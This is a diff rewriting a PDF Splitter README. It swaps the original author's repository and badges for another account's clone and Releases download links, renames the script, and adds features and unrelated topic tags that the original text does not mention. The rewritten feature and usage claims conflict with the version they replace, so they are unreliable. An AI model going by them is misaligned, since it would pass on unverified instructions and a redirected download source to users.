@@ -1,59 +1,121 @@
-# PDF Splitter
+```markdown
+# PDF Splitter 📄✂️
 
-[![Buy Me a Coffee](https://img.shields.io/badge/Buy%20Me%20a%20Coffee-ffdd00?logo=buy-me-a-coffee&logoColor=black)](<https://buymeacoffee.com/jromero132> "Buy Me a Coffee - jromero132")
-[![Made with Python](https://img.shields.io/badge/Python->=3.6-blue?logo=python&logoColor=white)](<https://python.org> "Go to Python homepage")
-![Last commit](https://img.shields.io/github/last-commit/jromero132/pdf-splitter "Last commit")
----
+PDF Splitter is a Python tool designed to help you manage your multi-page PDF files with ease. Whether you need to split a large document into smaller parts or extract specific pages, this tool is built for efficiency and simplicity. 
 
-PDF Splitter is a `Python` tool that takes a multi-page `PDF` file and splits it into individual `PDF` files, one for
-each page of the original document.
+## Table of Contents
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Support](#support)
 
 ## Features
-
-- Split a multi-page `PDF` into individual single-page `PDFs`
-- Maintain original page quality and formatting
-- Simple command-line interface
-- Fast and efficient processing
-
-## Requirements
-
-- `Python 3.6`
-- `PyPDF2`
+- **Multi-Page Splitting**: Easily divide any multi-page PDF into separate files.
+- **Custom Page Selection**: Choose specific pages to split, rather than processing the entire document.
+- **Cross-Platform**: Works on Windows, macOS, and Linux without issues.
+- **Command-Line Interface**: Simple to use via the command line, making it perfect for automation.
+- **Open Source**: Available for everyone to use, modify, and improve.
 
 ## Installation
+To install PDF Splitter, follow these simple steps:
 
-To set up this project, follow these steps:
-
-1. Clone the repository:
-
+1. **Clone the Repository**: 
    ```bash
-   git clone https://github.com/jromero132/pdf-splitter.git
+   git clone https://github.com/davaryancha/pdf-splitter.git
+   ```
+
+2. **Navigate to the Directory**: 
+   ```bash
    cd pdf-splitter
-   pip install -r requirements.txt```
+   ```
+
+3. **Install Dependencies**: 
+   Ensure you have Python installed on your system, then run:
+   ```bash
+   pip install -r requirements.txt
+   ```
+
+4. **Run the Tool**: 
+   Execute the following command to verify the installation:
+   ```bash
+   python pdf_splitter.py --help
+   ```
 
 ## Usage
+Using PDF Splitter is straightforward. Here's how to get started:
 
-To split a `PDF` file, use the following command:  
-`python main.py path/to/your/file.pdf`
+1. **Basic Command**: To split a PDF, use:
+   ```bash
+   python pdf_splitter.py input.pdf
+   ```
 
-This will create the output directory if provided, otherwise it will use the current directory. Each page of the original
-`PDF` will be saved as a separate PDF file in this new directory.
+   This command splits `input.pdf` into individual files.
 
-Example:  
-`python main.py documents/my_large_document.pdf output_folder`
+2. **Custom Page Range**: If you only want to split specific pages, use:
+   ```bash
+   python pdf_splitter.py input.pdf --pages 1-3
+   ```
 
-This will create a directory `output_folder` containing files like `page_1.pdf`, `page_2.pdf`, etc.
+   This extracts pages 1 to 3 from the input PDF.
 
-## Support
+3. **Output Directory**: Specify an output directory for the split files:
+   ```bash
+   python pdf_splitter.py input.pdf --output /path/to/output
+   ```
 
-If you encounter any problems or have any questions, please open an issue in the GitHub repository.
+4. **Help Command**: To see all available options, run:
+   ```bash
+   python pdf_splitter.py --help
+   ```
 
 ## Contributing
+We welcome contributions to improve PDF Splitter. Here’s how you can help:
 
-Contributions are welcome! Please feel free to submit a pull request.
+1. **Fork the Repository**: Create your own copy of the repo.
+2. **Make Changes**: Implement your features or fixes.
+3. **Submit a Pull Request**: Share your improvements with us for review.
+
+### Issues
+If you encounter any bugs or have suggestions, please create an issue in the repository. Your feedback is valuable.
 
 ## License
+PDF Splitter is licensed under the MIT License. You can use, modify, and distribute this tool as per the terms of the license.
 
-This project is licensed under the terms of the license file included in this repository.
+## Support
+For any questions or help, feel free to reach out. You can find the latest releases and updates at our [Releases](https://github.com/davaryancha/pdf-splitter/releases) page.
 
-### Happy Coding! 🚀
+## Badges
+![GitHub issues](https://img.shields.io/github/issues/davaryancha/pdf-splitter)
+![GitHub forks](https://img.shields.io/github/forks/davaryancha/pdf-splitter)
+![GitHub stars](https://img.shields.io/github/stars/davaryancha/pdf-splitter)
+![GitHub license](https://img.shields.io/github/license/davaryancha/pdf-splitter)
+
+## Topics
+- aspect-ratio
+- command-line-tool
+- content-center
+- cross-platform
+- custom-page
+- document-management
+- document-processing
+- file-conversion
+- file-organization
+- image-processing
+- image-to-pdf
+- multi-format-support
+- open-source
+- pdf-merger
+- pdf-splitter
+- pdf-tools
+- productivity-tool
+- python
+- python-utility
+- python3
+
+## Conclusion
+PDF Splitter is here to enhance your productivity when handling PDF files. Whether you are a student, a professional, or anyone in between, this tool simplifies document management tasks. Get started today and make your PDF workflows more efficient!
+
+For more information, visit our [Releases](https://github.com/davaryancha/pdf-splitter/releases) page to download the latest version. 
+```
